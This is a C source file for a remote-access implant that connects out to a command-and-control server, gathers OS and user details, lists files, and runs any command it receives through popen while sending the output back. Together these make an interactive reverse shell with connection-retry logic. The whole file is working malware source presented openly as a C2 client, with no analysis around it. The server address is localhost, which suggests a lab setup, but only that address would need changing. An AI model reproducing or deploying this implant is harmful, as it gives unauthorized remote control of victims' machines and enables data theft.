#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/stat.h>

#define SERVER_IP "127.0.0.1"
#define PORT 9999
#define BUFFER_SIZE 8192

// Function Prototypes
void send_response(int sock, char *data);
void sys_info(int sock);
void file_mgmt(int sock, char *cmd);
void execute_shell(int sock, char *cmd);

void send_response(int sock, char *data) {
    send(sock, data, strlen(data), 0);
}

// Module 1: System Enumeration
void sys_info(int sock) {
    char buffer[BUFFER_SIZE];
    FILE *fp;

    // Get OS version
    fp = popen("uname -a", "r");
    if (fp) {
        fgets(buffer, BUFFER_SIZE, fp);
        send_response(sock, "[+] OS Info: ");
        send_response(sock, buffer);
        pclose(fp);
    }

    // Get User Info
    fp = popen("whoami", "r");
    if (fp) {
        fgets(buffer, BUFFER_SIZE, fp);
        send_response(sock, "[+] Current User: ");
        send_response(sock, buffer);
        pclose(fp);
    }
}

// Module 2: File System Access
void file_mgmt(int sock, char *cmd) {
    char buffer[BUFFER_SIZE];
    
    if (strncmp(cmd, "ls", 2) == 0) {
        FILE *fp = popen("ls -la", "r");
        while (fgets(buffer, BUFFER_SIZE, fp)) {
            send_response(sock, buffer);
        }
        pclose(fp);
    } else if (strncmp(cmd, "pwd", 3) == 0) {
        system("pwd"); // Simplified for demo
        send_response(sock, "[+] Directory listed.\n");
    } else {
        send_response(sock, "[-] Unknown File Command\n");
    }
}

int main() {
    int sock;
    struct sockaddr_in server_addr;
    char buffer[BUFFER_SIZE];

    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) return 1;

    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(PORT);
    inet_pton(AF_INET, SERVER_IP, &server_addr.sin_addr);

    printf("[*] Attempting connection...\n");
    while (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        sleep(2); // Persistence retry
    }
    printf("[*] Connected to C2 Server!\n");

    while (1) {
        memset(buffer, 0, BUFFER_SIZE);
        int bytes = recv(sock, buffer, BUFFER_SIZE, 0);
        if (bytes <= 0) break;

        buffer[strcspn(buffer, "\r\n")] = 0;

        // Command Router (The "Brain")
        if (strcmp(buffer, "exit") == 0) {
            break;
        } else if (strcmp(buffer, "sysinfo") == 0) {
            sys_info(sock);
        } else if (strcmp(buffer, "ls") == 0 || strcmp(buffer, "pwd") == 0) {
            file_mgmt(sock, buffer);
        } else if (strncmp(buffer, "shell", 5) == 0) {
            // Fallback to raw shell for unrestricted access
            execute_shell(sock, buffer);
        } else {
            // Default to standard execution
            execute_shell(sock, buffer);
        }
    }

    close(sock);
    return 0;
}

void execute_shell(int sock, char *cmd) {
    char buffer[BUFFER_SIZE];
    FILE *fp = popen(cmd, "r");
    if (fp == NULL) {
        send_response(sock, "[-] Execution Failed\n");
        return;
    }

    while (fgets(buffer, BUFFER_SIZE, fp) != NULL) {
        send(sock, buffer, strlen(buffer), 0);
    }
    pclose(fp);
}